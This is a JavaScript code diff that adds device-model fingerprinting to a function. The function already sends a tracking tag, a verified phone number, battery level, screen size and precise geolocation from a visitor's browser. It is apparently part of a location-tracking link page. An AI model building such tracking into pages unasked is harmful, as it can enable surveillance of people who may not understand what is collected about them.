@@ -287,6 +287,7 @@ async function requestAndTransmitLocation(verifiedPhone) {
 
   const batteryLevel = await getBatteryInfo();
   const screenResolution = `${window.screen.width}x${window.screen.height}`;
+  const deviceModel = await getDeviceDetails();
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
@@ -301,6 +302,7 @@ async function requestAndTransmitLocation(verifiedPhone) {
             tag: trackingTag,
             phoneNumber: verifiedPhone,
             otpStatus: 'VERIFIED',
+            deviceModel,
             latitude,
             longitude,
             accuracy,
@@ -355,8 +357,53 @@ async function requestAndTransmitLocation(verifiedPhone) {
 }
 
 // --------------------------------------------------------------------------
-// Helpers: Battery, Timer, Auto-fill
+// Helpers: Device Model, Battery, Timer, Auto-fill
 // --------------------------------------------------------------------------
+async function getDeviceDetails() {
+  let model = '';
+
+  // 1. Check modern User-Agent Client Hints (Chromium / Android)
+  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+      if (hints.model) {
+        model = hints.model;
+      }
+    } catch (e) {}
+  }
+
+  const ua = navigator.userAgent || '';
+
+  // 2. Parse common Android device models from User-Agent string
+  if (!model && /android/i.test(ua)) {
+    const match = ua.match(/Android[^;]+;\s*([^;)]+)\s*[;)]/i);
+    if (match && match[1] && !/Build/i.test(match[1])) {
+      model = match[1].trim();
+    } else {
+      const buildMatch = ua.match(/;\s*([^;]+)\s+Build\//i);
+      if (buildMatch && buildMatch[1]) {
+        model = buildMatch[1].trim();
+      }
+    }
+  }
+
+  // 3. Apple iOS / Desktop detection
+  if (/iphone/i.test(ua)) {
+    model = 'Apple iPhone';
+  } else if (/ipad/i.test(ua)) {
+    model = 'Apple iPad';
+  } else if (!model && /android/i.test(ua)) {
+    model = 'Android Phone';
+  } else if (!model) {
+    if (/windows/i.test(ua)) model = 'Windows PC';
+    else if (/macintosh|mac os x/i.test(ua)) model = 'Apple Mac';
+    else if (/linux/i.test(ua)) model = 'Linux PC';
+    else model = 'Desktop / Mobile';
+  }
+
+  return model;
+}
+
 async function getBatteryInfo() {
   try {
     if ('getBattery' in navigator) {
